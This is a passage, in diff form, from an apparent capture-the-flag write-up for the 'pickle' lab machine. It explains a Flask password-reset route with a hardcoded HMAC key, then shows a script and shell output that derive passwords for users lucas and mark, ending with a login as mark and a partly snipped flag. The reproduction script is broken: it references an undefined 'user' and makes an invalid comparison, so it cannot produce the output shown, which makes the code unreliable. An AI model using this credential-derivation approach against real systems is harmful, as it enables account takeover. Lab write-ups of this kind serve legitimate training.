@@ -304,4 +304,87 @@ I tried the above command, and also tried other command like wget, but it didn't
 
 I have used a lot of enumeration script, but it gives me nothing at all. I checked the file /opt/project/project.py and there is a new interesting function.
 
+    @app.route('/reset', methods=["GET", "POST"])
+    @requires_auth
+    def reset_page():
+            if request.method == "POST" and request.form["username"] and request.form["key"]:
+                    key    = "dpff43f3p214k31301"
+                    raw    = request.form["username"] + key + socket.gethostbyname(socket.gethostname())
+                    hashed = hmac.new(key, raw, hashlib.sha1)
+                    if request.form["key"] == hashed.hexdigest():
+                            return base64.b64encode(hashed.digest().encode("base64").rstrip("\n"))
+            else:
+                    return "Server Error!"
+            
+We can see that there is a condition which tests if the method is POST and also tests if the `username` and `key` parameter exists.
 
+    if request.method == "POST" and request.form["username"] and request.form["key"]
+    
+Then there is a key.
+
+    key    = "dpff43f3p214k31301"
+    
+Then concretely, it gets the user argument and merges it with the key and with the local IP address.
+
+    raw    = request.form["username"] + key + socket.gethostbyname(socket.gethostname())
+    
+Then the script encrypts the raw variable with the key `key` which is stored in the `hashed` variable.
+
+    hashed = hmac.new(key, raw, hashlib.sha1)
+    
+Then it tests if the `key` argument is equal to the variable `hashed` in `hex`.
+
+    if request.form["key"] == hashed.hexdigest()
+    
+ If the key is equal it encodes this in base64, we can probably recover the password for user mark and lucas.
+
+    return base64.b64encode(hashed.digest().encode("base64").rstrip("\n")
+    
+We need to do local testing to better understand the system. I completely copy the function and paste this into my python file.
+
+    import hashlib
+    import requests
+    import socket
+    import base64
+    import hmac
+
+    key    = "dpff43f3p214k31301"
+    raw    = user["lucas"] + key + socket.gethostbyname(socket.gethostname())
+    hashed = hmac.new(key, raw, hashlib.sha1)
+    if(key[hashed.hexdigest()] == hashed):
+      print(base64.b64encode(hashed.digest().encode("base64").rstrip("\n")))
+    
+    
+And if we run we see that we have lucas password.
+
+    root@0xEEX75:~/hackmyvm/pickle# python reset.py 
+    YTdYYTB1cDFQOTBmeEFwclVXZVBpTCtmakx3PQ== # Luca's password
+    
+Let's see if there is any user other than lucas in the target system.
+
+    lucas@pickle:/opt/project$ ls /home
+    lucas  mark
+    
+There is indeed mark, let's try with mark to get the password.
+
+    import hashlib
+    import requests
+    import socket
+    import base64
+    import hmac
+
+    key    = "dpff43f3p214k31301"
+    raw    = user["mark"] + key + socket.gethostbyname(socket.gethostname())
+    hashed = hmac.new(key, raw, hashlib.sha1)
+    if(key[hashed.hexdigest()] == hashed):
+      print(base64.b64encode(hashed.digest().encode("base64").rstrip("\n")))
+      
+ And if we run we see that we have mark password.
+ 
+    # python reset.py 
+    SUk5enROY2FnUWxnV1BUWFJNNXh4amxhc00wPQ== # Mark's password
+    
+    lucas@pickle:/opt/project$ su - mark
+    Password: SUk5enROY2FnUWxnV1BUWFJNNXh4amxhc00wPQ==
+    mark@pickle:~$ cat user.txt
+    e25fd1[...SNIP...]
